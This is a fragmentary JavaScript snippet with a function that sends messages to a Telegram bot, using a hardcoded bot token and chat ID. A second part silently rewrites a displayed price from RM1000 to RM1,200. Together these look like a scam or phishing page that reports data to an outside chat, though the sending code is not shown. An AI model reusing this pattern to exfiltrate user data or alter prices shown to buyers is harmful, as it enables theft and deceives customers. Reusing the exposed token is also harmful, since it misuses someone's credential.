...
function sendToTelegram(message) {
  const token = "7910543384:AAFZH190xkz2jVSYBbBd1dwEn3s1C3cQ09c"; // Token bot Telegram Anda
  const chatId = "6852122158"; // Chat ID atau ID grup Anda
...
document.querySelectorAll(".h2").forEach((item) => {
  item.textContent = item.textContent.replace("RM1000", "RM1,200");
});
